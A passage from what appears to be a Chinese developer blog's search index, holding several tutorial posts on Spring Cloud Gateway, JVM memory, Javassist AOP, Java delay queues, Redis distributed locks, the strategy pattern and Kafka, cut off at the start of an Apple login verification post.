StripPrefix：去除原始请求路径中的前2级路径，即/gateway/provider1\n            - StripPrefix=2\n```\n\n以上的路由配置也可以基于bean来配置：\n```\n@Bean\npublic RouteLocator addLocator(RouteLocatorBuilder routeLocatorBuilder){\n    return routeLocatorBuilder.routes()\n            .route(\"gateway-client\", r -> r.path(\"/gclient/**\")\n                    .filters(f->f.addRequestParameter(\"X-Request-Token\",\"2020ABC\"))\n                    .uri(\"lb://gateway-client\")).build();\n}\n```\n\n \n**核心名词解释**\n- 路由（Route）：gateway的基本构建模块。它由ID、目标URI、断言和过滤器等组成。\n- 断言（Predicate ）：也翻译成谓词，用于定义转发规则。\n- 过滤器（Filter）：可以在返回请求之前或之后修改请求和响应的内容。\n\n\n**Predicate (断言) ([断言-官网参考文档](https://docs.spring.io/spring-cloud-gateway/docs/2.2.9.RELEASE/reference/html/#gateway-request-predicates-factories))**\n\ngateway内置了很多断言，篇幅限制，列出两种，源码位于：org.springframework.cloud.gateway.handler.predicate下：\n\n- AfterRoutePredicateFactory\n```\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: after_route\n        uri: http://mantou.plus  #如果请求时间在配置的时间点之后，全部转发到http://mantou.plus\n        predicates:\n        - After=2023-03-07T22:42:47.789-07:00[America/Denver]\n```\n\n- BeforeRoutePredicateFactory\n```\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: after_route\n        uri: http://www.mantou.plus  #如果请求时间在配置的时间点之前，全部转发到http://mantou.plus\n        predicates:\n        - Before=2023-03-07T22:42:47.789-07:00[America/Denver]\n```\n\n**过滤器 ([过滤器-官网参考文档](https://docs.spring.io/spring-cloud-gateway/docs/2.2.9.RELEASE/reference/html/#gatewayfilter-factories))** \n\ngateway也内置了很多过滤器，，篇幅限制，列出两种，源码位于：org.springframework.cloud.gateway.filter.factor下：\n\n- AddRequestHeader\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: add_request_header_route\n        uri: https://mantou.plus    #在请求发到目标微服务之前添加请求头X-Request-red，其值为：blue\n        filters:\n        - AddRequestHeader=X-Request-red, blue\n```\n\n- StripPrefix\n\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: strip_prefix_route\n        uri: https://mantou.plus   #在请求发到目标微服务之前去掉1级前缀，例如 http://localhost:8080/name/weixiaojie，就会转发到:https://mantou.plus/weixiaojie\n        predicates:\n        - Path=/name/**\n        filters:\n        - StripPrefix=1\n```\n\n自定义过滤器：\n\n```java\n@Slf4j\n@Component\npublic class MyGatewayFilterFactory extends AbstractGatewayFilterFactory {\n\n    @Override\n    public GatewayFilter apply(Object config) {\n        return ((exchange, chain) -> {\n            log.info(\"自定义过滤器添加请求头：blog,添加响应头: Title\");\n            ServerHttpRequest request = exchange.getRequest().mutate().header(\"blog\", \"https://mantou.plus\").build();\n            ServerWebExchange ex = exchange.mutate().request(request).build();\n            ex.getResponse().getHeaders().add(\"Title\",\"BlackHorse\");\n            return chain.filter(ex);\n        });\n\n    }\n}\n\n```\n\nGlobalFilter，无需配置，全局生效:\n\n```java\n@Slf4j\n@Component\n@Order(1)\npublic class TokenGlobalFilter implements GlobalFilter {\n\n    @Override\n    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        log.info(\"进入token过滤器\");\n        String token = exchange.getRequest().getHeaders().getFirst(\"token\");\n        if (token != null && !\"\".equals(token)) {\n            log.info(\"找到了token：{}\", token);\n            return chain.filter(exchange);\n        } else {\n            log.error(\"没有找到token，未授权，不允许访问\");\n            ServerHttpResponse response = exchange.getResponse();\n            response.setStatusCode(HttpStatus.UNAUTHORIZED);\n            return response.setComplete();\n        }\n    }\n}\n\n```\n\n```java\n@Slf4j\n@Component\n@Order(2)\npublic class LogGlobalFilter implements GlobalFilter {\n\n    @Override\n    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        log.info(\"进入日志过滤器\");\n        //filter的前置处理\n        ServerHttpRequest request = exchange.getRequest();\n        String path = request.getPath().pathWithinApplication().value();\n        InetSocketAddress remoteAddress = request.getRemoteAddress();\n        return chain\n                //继续调用filter\n                .filter(exchange)\n                //filter的后置处理\n                .then(Mono.fromRunnable(() -> {\n                    ServerHttpResponse response = exchange.getResponse();\n                    HttpStatus statusCode = response.getStatusCode();\n                    log.info(\"请求路径:{},远程IP地址:{},响应码:{}\", path, remoteAddress, statusCode);\n                }));\n    }\n}\n```\n\n\n\n**集成注册中心**\n\n微服务情况下，每个服务有多个实例，为了防止IP变化等引起的调用问题，就需要引入服务注册和服务发现\n\n\npom文件添加依赖：\n\n```\n\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>com.alibaba.cloud</groupId>\n  <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n</dependency>\n```\n\n\n启动类添加：@EnableDiscoveryClient注解\n```java\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class GatewayApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(GatewayApplication.class, args);\n    }\n\n}\n```\n\n每个服务的application.yml加入以下内容，表示把该服务注册到nacos注册中心中去：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      discovery:\n        # nacos的服务地址，nacos-server中IP地址:端口号\n        server-addr: 127.0.0.1:8001\n```\n\n修改routes配置，可以使用服务名称来调用了：其中lb表示负载均衡，\n```\n#uri: http://localhost:8081\nuri: lb://provider_1\n```\n\n\n**自定义全局异常处理**\n\n当遇到异常的时候，可以做一些自定义处理，比如使用返回json格式结果，更易于前段解析 \n\n```java\n@Slf4j\n@Order(-1)\n@Component\n@RequiredArgsConstructor\npublic class GlobalErrorExceptionHandler implements ErrorWebExceptionHandler {\n\n    private final ObjectMapper objectMapper;\n\n    @SuppressWarnings({\"rawtypes\", \"unchecked\", \"NullableProblems\"})\n    @Override\n    public Mono<Void> handle(ServerWebExchange exchange, Throwable ex) {\n        ServerHttpResponse response = exchange.getResponse();\n        if (response.isCommitted()) {\n            return Mono.error(ex);\n        }\n\n        // JOSN格式返回\n        response.getHeaders().setContentType(MediaType.APPLICATION_JSON);\n        if (ex instanceof ResponseStatusException) {\n            response.setStatusCode(((ResponseStatusException) ex).getStatus());\n        }\n\n        return response.writeWith(Mono.fromSupplier(() -> {\n            DataBufferFactory bufferFactory = response.bufferFactory();\n            try {\n                CommonResponse resultMsg = new CommonResponse(\"500\", ex.getMessage(), null);\n                return bufferFactory.wrap(objectMapper.writeValueAsBytes(resultMsg));\n            } catch (JsonProcessingException e) {\n                log.error(\"Error writing response\", ex);\n                return bufferFactory.wrap(new byte[0]);\n            }\n        }));\n    }\n\n    @Data\n    @NoArgsConstructor\n    @AllArgsConstructor\n    public static class CommonResponse {\n        String code;\n        String message;\n        String data;\n    }\n\n}\n```\n\n\n\n\n**实现动态路由**\n\n从前面我们可以看到路由的配置主要通过application.yml和代码@Bean配置，无论是哪一种，在启动网关后将无法修改路由配置，如有新服务要上线，则需要先把网关下线，修改 yml 配置后，再重启网关。核心类为：RouteDefinitionWriter，位于org.springframework.cloud.gateway.route包下 。此处需要阅读源码，方式较多，我们放到下一节介绍。"},{"title":"项目管理学习笔记","url":"/2023/02/12/项目管理学习笔记/","content":"\n在极客时间上买了个项目管理课，花了一周时间学习了下，[课程地址](https://time.geekbang.org/column/intro/100038501?tab=catalog)，学习笔记如下：\n\n![项目管理学习笔记](/image/5.png)\n\n\n\n\n"},{"title":"深入理解Java虚拟机","url":"/2022/11/07/深入理解Java虚拟机/","content":"\njava开发过程难免会遇到内存溢出，CPU消耗过高等问题，理解JVM结构及其原理有助于排查以上问题，其架构如下：\n\n![JVM架构图](/image/10.png)\n\n    **其中方法区和java堆，为线程共享区域。程序计数器，虚拟机栈，本地方法栈为线程独占区。**\n\n- 方法区：存储运行时常量池，已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。在jdk7及以前，习惯上把方法区，称为永久代。只有HotSpot才有永久代。对EA JRockit、 IBM J9等来说，是不存在永久代的概念的。jdk8开始， 使用元空间取代了永久代。方法区在JVM启动的时候被创建，并且它的实际的物理内存空间中和Java堆区一样都可以是不连续的。 方法区的大小，跟堆空间一样，可以选择固定大小或者可扩展。方法区的大小决定了系统可以保存多少个类，如果系统定义了太多的类，导致方法区溢出，虚拟机同样会抛出内存溢出错误: java.lang .OutofMemoryError:PermGenspace（1.8之前）或者java.lang.OutOfMemoryError: Metaspace（1.8之后），关闭JVM就会释放这个区域的内存。例如：加载大量的第三方的jar包; Tomcat 部署的工程过多(30-50个) ;大量动态的生成反射类都有可能OOM。\n\n- Java堆：存储对象实例，有Eden区，Survivor区（2个），OldGen老年代， 其中比例：（三部分比例8:1:1）Eden + Survivor +Survivor （1/3堆内存） ，old区（2/3堆内存）。\n\n- 虚拟机栈：存放方法运行时所需的数据，每个方法被执行的时候，Java虚拟机都会同步创建一个栈帧（Stack Frame）。生命周期与线程相同（随线程而生，随线程而灭）。每一个方法被调用直至执行完毕的过程，就对应这一个栈帧在虚拟机栈中从入栈到出栈的过程。如果线程请求分配的栈容量超过Java虚拟机允许的最大容量，则抛出StackOverflowError异常（比如错误的递归调用）；\n\n- 本地方法栈：基本同虚拟机栈，只不过调用的方法为native方法\n\n- 程序计数器：记录当前线程所执行到的字节码的行号，以及JVM指令地址，字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令。是程序控制流的指示器，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成，是唯一一个在java虚拟机规范中没有规定任何OOM(Out Of Memery)情况的区域,而且没有垃圾回收\n\n- Execution Engine（执行引擎）：负责解释命令，提交操作系统执行。包括：中间代码生成器，代码优化器，目标代码生成器，探测分析器，以及垃圾收集GC\n\n\n    **MinorGC的过程 (复制->清空->互换)**\n\n- SurvivorFrom 复制到 SurvivorTo，年龄+1eden首先，当Eden区满的时候会触发第一次GC,把还活着的对象拷贝到SurvivorFrom区，当Eden区再次触发GC的时候会扫描Eden区和From区域,对这两个区域进行垃圾回收，经过这次回收后还存活的对象,则直接复制到To区域(如果有对象的年龄已经达到了老年的标准，则赋值到老年代区)，同时把这些对象的年龄+1 。然后清空 eden、SurvivorFrom\n\n\n- 清空Eden和SurvivorFrom中的对象，也即复制之后有交换，谁空谁是to,SurvivorTo和 SurvivorFrom 互换\n\n- 最后，SurvivorTo和SurvivorFrom互换，原SurvivorTo成为下一次GC时的SurvivorFrom区。部分对象会在From和To区域中复制来复制去,如此交换15次(由JVM参数MaxTenuringThreshold决定,这个参数默认是15),最终如果还是存活,就存入到老年代\n\n- 扩展：之所以使用两个**Survivor**，是为了以空间换时间，如果只有一个survivor，survivor区的GC回收只能只用标记整理算法（效率较低）或者标记清楚算法（存在内存碎片），\n\n\n    **设置方法区内存大小**\n\n- jdk7及以前: 通过-XX:PermSize来设置永久代初始分配空间。默认值是20.75M，-XX :MaxPe rmSi ze来设定永久代最大可分配空间。32位机器默认是64M，64位机 器模式是82M，当JVM加载的类信 息容量超过了这个值，会报异常Outo fMemoryError : PermGen space。\n\n- jdk8及以后: 元数据区大小可以使用参数-XX:MetaspaceSize和-XX :MaxMetaspaceSize指定，替代上述原有的两个参数。默认值依赖于平台。windows下，-XX :MetaspaceSize是21M， -XX :MaxMetaspaceSize的值是-1，即没有限制。与永久代不同，如果不指定大小，默认情况下，虚拟机会耗尽所有的可用系统内存。如果元数据区发生溢出，虚拟机一样会抛出异常OutOfMemoryError: Metaspace\n-XX:MetaspaceSize: 设置初始的元空间大小。对于64位的服务器端JVM来说, (其默认的-XX:MetaspaceSize值为21MB。这就是初始的高水位线，一 旦触及这个水位线，Full GC将会被触发并卸载没用的类(即这些类对应的类加载器不再存活)，然后这个高水位线将会重置。新的高水位线的值取决于GC后释放了多少元空间。如果释放的空间不足，那么在不超过MaxMetaspaceSize时，适当提高该值。如果释放空间过多，则适当降低该值。如果初始化的高水位线设置过低，上述高水位 线调整情况会发生很多次。通过垃圾回收器的日志可以观察到Full GC多次调用。为了避免频繁地GC，建议将-XX :MetaspaceSize设置为一个相对较高的值。\n\n\n     **垃圾回收算法**\n![垃圾回收算法](/image/11.png)\n\n\n     **G1垃圾收集器**\n\n这里是G1垃圾收集器的内容，超级大馒头休息去了，等待补充......\n\n     **内存模型（Java Memory Model ,简称JMM）**\n\n![内存模型](/image/12.png)\n\nJava内存模型规定了所有的变量都存储在主内存中，每条线程还有自己的工作内存，线程的工作内存中保存了该线程中是用到的变量的主内存副本拷贝，线程对变量的所有操作都必须在工作内存中进行，而不能直接读写主内存。不同的线程之间也无法直接访问对方工作内存中的变量，线程间变量的传递均需要自己的工作内存和主存之间进行数据同步进行。而JMM就作用于工作内存和主存之间数据同步过程。他规定了如何做数据同步以及什么时候做数据同步。\n\n**内存模型的8种操作模式**\n\n- lock（锁定）：作用于主内存的变量，把一个变量标识为一条线程独占状态。\n- unlock（解锁）：作用于主内存变量，把一个处于锁定状态的变量释放出来，释放后的变量才可以被其他线程锁定。\n- uread（读取）：作用于主内存变量，把一个变量值从主内存传输到线程的工作内存中，以便随后的load动作使用。\n- uload（载入）：作用于工作内存的变量，它把read操作从主内存中得到的变量值放入工作内存的变量副本中。\n- uuse（使用）：作用于工作内存的变量，把工作内存中的一个变量值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时将会执行这个操作。\n- uassign（赋值）：作用于工作内存的变量，它把一个从执行引擎接收到的值赋值给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作。\n- ustore（存储）：作用于工作内存的变量，把工作内存中的一个变量的值传送到主内存中，以便随后的write的操作。\n- uwrite（写入）：作用于主内存的变量，它把store操作从工作内存中一个变量的值传送到主内存的变量中。\n\n**内存模型的3个特性**\n\n- 原子性：在Java中，为了保证原子性，提供了两个高级的字节码指令monitorenter和monitorexit。因此，在Java中可以使用synchronized来保证方法和代码块内的操作是原子性的。\n\n- 可见性：volatile关键字提供了一个功能，被其修饰的变量在被修改后可以立即同步到主内存，被其修饰的变量在每次是用之前都从主内存刷新，以此来保证可见性\n\n- 有序性：在Java中，可以使用synchronized和volatile来保证多线程之间操作的有序性。volatile关键字会禁止指令重排。synchronized关键字保证同一时刻只允许一条线程操作。\n\n\n    **四种引用类型**\n![四种引用类型](/image/13.png)"},{"title":"云原生微服务架构图","url":"/2022/10/09/云原生微服务架构图/","content":"\n微服务和容器化已经成为目前互联网架构的主流选择，包含大量的中间件，如下：\n\n版本1：\n![云原生微服务架构图](/image/9.png)\n\n版本2：\n![云原生微服务架构图](/image/8.png)\n\n\n\n\n\n\n"},{"title":"使用Javassist实现AOP","url":"/2022/05/24/使用Javassist实现AOP/","content":"\n在spring等框架中经常会用到AOP对已有的功能做切面处理，比如：日志记录，数据库事务处理，缓存，权限处理等，需要用到动态代理，常见的动态代理有： \n\nJDK ProxyGenerator、CGLIB、Javassist、ASM\n\n其原理都是修改字节码生成class文件，然后通过类加载器重新加载动态生成的class文件\n\n其中Javassist使用最为简单：\n\n```\n<dependency>\n    <groupId>org.javassist</groupId>\n    <artifactId>javassist</artifactId>\n    <version>3.28.0-GA</version>\n</dependency>\n```\n\n```\npackage com.example.javassist;\n\npublic class Hello {\n\n    public static void say() {\n        System.out.println(\"hello world!\");\n    }\n\n}\n```\n\n```\npackage com.example.javassist;\n\nimport javassist.*;\n\npublic class Javassist {\n\n    public static void main(String[] args) throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass cc = pool.get(\"com.example.javassist.Hello\");\n        CtMethod personFly = cc.getDeclaredMethod(\"say\");\n        personFly.insertBefore(\"System.out.println(\\\"执行方法之前\\\");\");\n        personFly.insertAfter(\"System.out.println(\\\"执行方法之后\\\");\");\n        cc.toClass();\n        Hello.say();\n    }\n\n}\n```\n\n输出结果：\n\n``` shell\n执行方法之前\nhello world!\n执行方法之后\n```"},{"title":"Java延时队列","url":"/2021/06/23/Java延时队列/","content":"\n在业务开发中常常存在超时处理机制，比如订单多久没支付自动取消，命令执行太久自动取消执行之类。可以使用redis的key过期订阅机制，也可以使用rabbitmq的死信队列，亦或是循环轮训数据库等等来实现。在业务量小，无中间件的情况下，就可以考虑使用java原生的延时队列来实现，如下：\n\n```java\npackage com.example.quene;\n\nimport lombok.Data;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.concurrent.DelayQueue;\nimport java.util.concurrent.Delayed;\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\npublic class DelayQuene {\n\n    public static final DelayQueue<DelayedOrder> DELAY_QUEUE = new DelayQueue<>();\n\n    @Data\n    public static class DelayedOrder implements Delayed {\n\n        private int index;\n\n        private long timeout;\n\n        public DelayedOrder(long timeout) {\n            this.timeout = timeout + System.nanoTime();\n        }\n\n        @Override\n        public int compareTo(Delayed other) {\n            if (other == this) {\n                return 0;\n            }\n            long d = (getDelay(TimeUnit.NANOSECONDS) - other.getDelay(TimeUnit.NANOSECONDS));\n            return (d == 0) ? 0 : ((d < 0) ? -1 : 1);\n        }\n\n        // 返回距离你自定义的超时时间还有多少\n        @Override\n        public long getDelay(TimeUnit unit) {\n            return unit.convert(timeout - System.nanoTime(), TimeUnit.NANOSECONDS);\n        }\n\n        public void excute() {\n            log.info(\"第{}个订单已经到期未支付，自动取消\", index);\n        }\n\n    }\n\n    public static void main(String[] args) {\n\n        for (int i = 1, len = 10; i <= len; i++) {\n            //延时队列放入10个订单，订单的过期时间分别为 1秒，2秒，3秒，4秒.......\n            DelayedOrder order = new DelayedOrder(TimeUnit.SECONDS.toNanos(i));\n            order.setIndex(i);\n            DELAY_QUEUE.put(order);\n        }\n\n        new Thread(new Runnable() {\n            @SneakyThrows\n            @Override\n            public void run() {\n                while (true) {\n                    //阻塞方法，无订单过期时阻塞等待\n                    DelayedOrder take = DELAY_QUEUE.take();\n                    take.excute();\n                }\n            }\n        }).start();\n\n    }\n\n}\n\n```"},{"title":"基于Redis的分布式锁","url":"/2021/05/18/基于Redis的分布式锁/","content":"\n在集群多机器环境中，为了避免并发导致的冲突问题，就会使用到分布式锁，同一时刻，集群中只有获取到锁的节点能够执行处逻辑，如下：\n\n\n```java\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.Collections;\n\n@Service(\"RedisSevice\")\npublic class RedisSevice {\n\n    @Autowired\n    JedisPool jedisPool;\n\n    private static final String LOCK_SUCCESS = \"OK\";\n    \n    //如果不存在key值就存入redis，如果存在返回失败，过期自动删除\n    private static final String SET_IF_NOT_EXIST = \"NX\";\n    \n    private static final String SET_WITH_EXPIRE_TIME = \"PX\";\n\n    public boolean tryGetDistributedLock(String lockKey, String value, int expireTime) {\n        Jedis jedis = jedisPool.getResource();\n        //往redis写入key及value，如果key存在返回写入失败表示获取锁失败，key不存在返回写入成功表示获取锁成功\n        String result = jedis.set(lockKey, value, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME, expireTime);\n\n        if (LOCK_SUCCESS.equals(result)) {\n            return true;\n        }\n        return false;\n    }\n\n    private static final Long RELEASE_SUCCESS = 1L;\n\n    public boolean releaseDistributedLock(String lockKey, String value) {\n        Jedis jedis = jedisPool.getResource();\n        /*当A节点获取锁之后执行过久，导致锁过期自动释放，B节点获取到了锁执行逻辑中，\n        这时A执行完毕准备释放锁，如果发现value不是自己设置的，说明当前锁已经不是自己持有，则不能释放*/\n        String script = \"if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end\";\n        Object result = jedis.eval(script, Collections.singletonList(lockKey), Collections.singletonList(value));\n\n        if (RELEASE_SUCCESS.equals(result)) {\n            return true;\n        }\n        return false;\n    }\n\n}\n\n```\n\n\n```\n@Component\npublic class DistributedLock{\n\n    @Autowired\n    RedisSevice redisSevice;\n    \n    //redis分布式锁key过期时间，防止执行时间过久或者宕机等异常原因导致锁无法释放\n    private static final int EXPIRE_TIME = 30000;\n    \n    public void main(String[] args) {\n        String lockKey = \"key值\";\n        String lockValue = \"value值，可用集群机器IP表明锁的持有者\";\n        boolean lockable = redisSevice.tryGetDistributedLock(lockKey, lockValue, EXPIRE_TIME);\n        if (lockable) {\n            try {\n                //获取到锁，执行业务逻辑\n            } finally {\n                //执行结束释放锁\n                redisSevice.releaseDistributedLock(lockKey, value);\n            }\n        }\n    }\n    \n}\n```\n\n上述情况主要适用于单机redis，如果是集群，master数据未同步到salve节点时宕机，会导致锁丢失的问题，推荐使用Redisson分布式锁。\n"},{"title":"JAVA策略模式","url":"/2021/04/07/JAVA策略模式/","content":"\n在多场景的代码中，需要根据前端传来的参数走不同的代码逻辑，例如：\n\n```\npublic static void main(String[] args) {\n        String code = \"前端传来的场景码\";\n        String param = \"前端传来的参数\";\n        if ((\"0001\").equals(code)) {\n            System.out.println(\"开始执行场景0001的逻辑,参数\" + param);\n        } else if ((\"0002\").equals(code)) {\n            System.out.println(\"开始执行场景0002的逻辑,参数\" + param);\n        } else if ((\"0003\").equals(code)) {\n            System.out.println(\"开始执行场景0003的逻辑,参数\" + param);\n        } else if ((\"0004\").equals(code)) {\n            System.out.println(\"开始执行场景0004的逻辑,参数\" + param);\n        } else if ((\"0005\").equals(code)) {\n            System.out.println(\"开始执行场景0005的逻辑,参数\" + param);\n        } else if ((\"0006\").equals(code)) {\n            System.out.println(\"开始执行场景0006的逻辑,参数\" + param);\n        } else {\n            System.out.println(\"场景编码不合适\");\n        }\n}\n```\n\n每当有新的场景需要走新的逻辑的时候，就会需要修改代码，添加新的else if判断，这种情况修改同一个类的代码很容易不小心修改了前面的逻辑，可能把以前已经写好的代码弄出bug\n\n在设计模式中，有几个准则，其中一个准则是 \"对修改关闭，对新增开放\"，意思是当有新需求来的时候，尽量不修改代码，只新增代码，那么就可以用以下的代码来实现：\n\n\n###策略主类\n```\npackage com.example.strategy;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Strategy {\n\n    private static Strategy instance = new Strategy();\n\n    public static Strategy GetInstance() {\n        return instance;\n    }\n\n    private static final Map<String, AbstractStrategy> map = new HashMap<>();\n\n    public static void excute(String code, String param) {\n        map.get(code).excute(param);\n    }\n\n    abstract public class AbstractStrategy {\n\n        public abstract String getSceneCode();\n\n        public abstract void excute(String param);\n\n        public AbstractStrategy() {\n            map.put(this.getSceneCode(), this);\n        }\n\n    }\n\n    public static void main(String[] args) {\n        String code = \"前端传来的场景码\";\n        String param = \"前端传来的参数\";\n        Strategy.excute(\"code\",param);\n    }\n\n}\n\n```\n\n#策略实现类0001\n```\npackage com.example.strategy;\n\n@Component\npublic class Strategy0001 extends Strategy.AbstractStrategy {\n\n    Strategy0001() {\n        //类上添加@Component注解， spring初始化bean时，会调用父类的构造函数，将当前bean注册到map中\n        Strategy.GetInstance().super();\n    }\n\n    @Override\n    public String getSceneCode() {\n        return \"0001\";\n    }\n\n    @Override\n    public void excute(String param) {\n        System.out.println(\"开始执行场景0001的逻辑，参数为：\" + param);\n    }\n\n}\n\n```\n\n\n#策略实现类0002\n```\npackage com.example.strategy;\n\n@Component\npublic class Strategy0002 extends Strategy.AbstractStrategy {\n\n    Strategy0002() {\n        //类上添加@Component注解， spring初始化bean时，会调用父类的构造函数，将当前bean注册到map中\n        Strategy.GetInstance().super();\n    }\n\n    @Override\n    public String getSceneCode() {\n        return \"0002\";\n    }\n\n    @Override\n    public void excute(String param) {\n        System.out.println(\"开始执行场景0002的逻辑，参数为：\" + param);\n    }\n\n}\n\n```\n\n通过以上代码，每当有新的业务场景来的时候，不用修改已经上线的代码，只需新增场景代码类，达到\"对修改关闭，对新增开放\"的效果。"},{"title":"kafka架构","url":"/2021/03/05/kafka架构/","content":"\nKafka是一个分布式的消息队列，其架构如下：\n\n\n![kafka架构](/image/6.png)\n\n- Broker ：一台 kafka 服务器就是一个 broker。一个集群由多个 broker 组成。一个 broker可以容纳多个topic；\n\n- Producer ：消息生产者，就是向 kafka broker 发消息的客户端；\n\n- Consumer ：消息消费者，向 kafka broker 取消息的客户端；\n\n- Consumer Group （CG）：消费者组，由多个 consumer 组成。消费者组内每个消费者负责消费不同分区的数据，一个分区只能由消费者组中的一个消费者消费；消费者组之间互不影响。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者；\n\n- Topic ：可以理解为一个队列，生产者和消费者面向的都是一个 topic；\n\n- Partition：为了实现扩展性，一个非常大的 topic 可以分布到多个 broker（即服务器）上，一个 topic 可以分为多个 partition，每个partion储存不同的数据，每个 partition 是一个有序的队列；\n\n- Replica：副本，为保证集群中的某个节点发生故障时，该节点上的 partition 数据不丢失，且 kafka 仍然能够继续工作，kafka提供了副本机制，一个 topic 的每个分区都有若干个副本，一个 leader 和若干个 follower。\n\n- Leader：每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是 leader。\n\n- Follower：每个分区多个副本中的“从”，实时从 leader 中同步数据，保持和 leader 数据的同步。leader 发生故障时，某个 follower 会成为新的follower。\n\n\n对于每一个topic， Kafka集群都会维持一个分区日志，如下所示：\n\n![kafka架构](/image/7.png)\n\n每个分区都是有序且顺序不可变的记录集，并且不断地追加到结构化的commit log文件。分区中的每一个记录都会分配一个id号来表示顺序，我们称之为offset，offset用来唯一的标识分区中每一条记录。\n\nKafka每个分区的数据是严格有序的，但多分区之间不能确保有序。 \n\n[参考资料](https://mrbird.cc/Kafka%E5%85%A5%E9%97%A8.html)\n"},{"title":"高频八股文","url":"/2020/06/19/高频八股文/","content":"\n理解八股文，可以提高面试成功率，亦可以提高我们对底层知识的理解：\n\n- [redis主从、哨兵、分片集群1](https://juejin.cn/post/6894048481422344199) \n\n- [redis主从、哨兵、分片集群2](https://juejin.cn/post/7077343204567154695)\n\n- [redis集群gossip协议](https://mp.weixin.qq.com/s?__biz=MzIwNDAyOTI2Nw==&mid=2247484398&idx=1&sn=76a82a0565ef273c1c4adff678526b20&chksm=96c72fd2a1b0a6c4f4fdddff096ecc110e10042629c262e6fd1a9dbaaa60b49438b10bd911f5&token=1616219814&lang=zh_CN#rd)\n\n- [详解redis集群gossip协议](https://juejin.cn/post/6902004920543952909)\n\n- [Redis缓存穿透/击穿/雪崩以及数据一致性的解决方案](https://juejin.cn/post/7185923117611483196)\n\n- [redis看门狗机制](https://juejin.cn/post/7148625453060718605)\n\n- [mysql与redis缓存一致性](https://mp.weixin.qq.com/s/qiC7gXgnkA9ZyaQwfskBSg)\n\n- [秒杀系统设计](https://juejin.cn/post/7044032901662375949)\n\n- [mysql锁机制](https://juejin.cn/post/6844903668571963406)\n\n- [redo，undo，binlog](https://juejin.cn/post/7157956679932313608)\n\n- [mysql数据存储结构](https://juejin.cn/post/7195489874408177723)\n\n- [线程和线程池的状态](https://juejin.cn/post/6847902222127202318)\n\n- [分布式事务原理](https://juejin.cn/post/7022800217518899237)\n\n- [手写分布式事务](https://juejin.cn/post/7171714480768811021)\n\n- [索引失效的情况](https://juejin.cn/post/7069562982711164965)\n\n- [全解mysql系列](https://juejin.cn/column/7140138832598401054)\n\n- [TCP握手原理](https://juejin.cn/post/6844904070000410631)\n\n- [http协议版本区别](https://juejin.cn/post/7095903366001197087)\n\n- [VUE基础面试合集](https://juejin.cn/post/6850037277675454478)\n\n- [消息队列有序消费，重复消息，消息丢失，消息堆积](https://juejin.cn/post/6850418106372882446)  \n\n- [消息丢失，堆积](https://juejin.cn/post/7130471165130178591)\n\n- [双亲委托机制](https://juejin.cn/post/7102219703891787784)\n\n- [线程池中不同队列的区别](https://juejin.cn/post/7003262515471712292)\n\n- [事务哪些情况会失效](https://juejin.cn/post/7173930524203810847)\n\n- [浏览器输入域名到页面出现经历了那些过程](https://juejin.cn/post/6905931622374342670)\n\n- [mysql分页offset偏移量过大解决方案](https://juejin.cn/post/7012016858379321358)\n\n- [ArrayBlockingQueue和LinkedBlockingQueue的区别](https://juejin.cn/post/6844903602448760845)\n"},{"title":"苹果登录服务端验证","url":"/2020/05/26/苹果登录服务端验证/","content":"### java版本：\n\n`POM文件：`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>AppleLogin</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <repositories>\n        <repository>\n            <id>nexus-aliyun</id>\n            <name>Nexus aliyun</name>\n            <url>http://maven.aliyun.com/nexus/content/groups/public</url>\n        </repository>\n    </repositories>\n\n    <dependencies>\n\n        <dependency>\n            <groupId>com.alibaba</groupId>\n            <artifactId>fastjson</artifactId>\n            <version>1.2.51</version>\n        </dependency>\n\n        <dependency>\n            <groupId>org.jodd</groupId>\n            <artifactId>jodd-http</artifactId>\n            <version>4.3.2</version>\n        </dependency>\n\n        <dependency>\n            <groupId>com.auth0</groupId>\n            <artifactId>java-jwt</artifactId>\n            <version>3.4.1</version>\n        </dependency>\n\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <version>1.18.8</version>\n        </dependency>\n\n        <dependency>\n            <groupId>ch.qos.logback</groupId>\n            <artifactId>logback-classic</artifactId>\n            <version>1.2.3</version>\n        </dependency>\n\n    </dependencies>\n\n</project>\n```\n\n`苹果公钥地址返回结果映射实体类：`\n\n```java\nimport lombok.Data;\n\nimport java.util.List;\n\n@Data\npublic class AppleAuthKeys {\n\n    private List<Item> 